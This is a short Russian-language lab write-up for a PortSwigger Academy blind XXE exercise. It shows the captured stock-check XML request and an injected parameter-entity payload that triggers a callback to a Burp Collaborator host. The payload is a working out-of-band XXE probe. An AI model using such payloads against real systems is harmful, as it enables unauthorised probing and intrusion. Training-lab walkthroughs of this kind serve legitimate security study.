зайдем на случайный товар на уязвимом ресурсе и с помощью `Check stock` найдем количество товара
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/4.%20Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities/pics%20for%20walktrough/1.png)
Перейдем в Proxy -> HTTP history и найдем тот самый запрос 
```
POST /product/stock
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/4.%20Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities/pics%20for%20walktrough/2.png)
Внедрим XML-инъекцию как в прошлой лабораторной работе, и увидим неудачу
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/4.%20Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities/pics%20for%20walktrough/3.png)
Внедрим XML-инъекцию
```
POST /product/stock
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://ob39m91xz9khb2xpgubnbxxjsay1mtai.oastify.com"> %xxe; ]>

```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/4.%20Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities/pics%20for%20walktrough/4.png)
хоть и выдало 400 респонс статус код, но отсутук на бурпколлаборатор все равно случился
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/4.%20Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities/pics%20for%20walktrough/5.png)
